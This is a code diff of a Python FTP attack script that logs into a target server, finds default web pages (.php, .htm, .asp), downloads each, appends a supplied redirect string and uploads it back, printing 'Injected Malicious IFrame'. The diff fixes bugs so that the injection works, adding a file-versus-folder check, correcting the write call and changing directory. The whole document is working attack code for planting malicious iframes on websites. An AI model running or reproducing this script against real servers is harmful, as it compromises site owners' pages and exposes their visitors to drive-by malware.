@@ -43,15 +43,17 @@ def returnDefault(ftp):
     retList = []
     for fileName in dirList:
         fn = fileName.lower()
-        if '.php' in fn or '.htm' in fn or '.asp' in fn:
-            print('[+] Found default page: ' + fileName)
-        retList.append(fileName)
+        if fn.find(".") >= 0: #judge name  file or fold
+            if '.php' in fn or '.htm' in fn or '.asp' in fn:
+                print('[+] Found default page: ' + fileName)
+            retList.append(fileName)
     return retList
 def injectPage(ftp, page, redirect):
+    print("inject page: " + page)
     f = open(page + '.tmp', 'w')
     ftp.retrlines('RETR ' + page, f.write)
     print('[+] Downloaded Page: ' + page)
-    f.write(redirect, 'wb')
+    f.write(redirect)
     f.close()
     print('[+] Injected Malicious IFrame on: ' + page)
     ftp.storlines('STOR ' + page, open(page + '.tmp', 'rb'))
@@ -59,6 +61,7 @@ def injectPage(ftp, page, redirect):
 def attack(username, password, tgtHost, redirect):
     ftp = ftplib.FTP(tgtHost)
     ftp.login(username, password)
+    ftp.cwd('ftp')
     defPages = returnDefault(ftp)
     for defPage in defPages:
         injectPage(ftp, defPage, redirect)
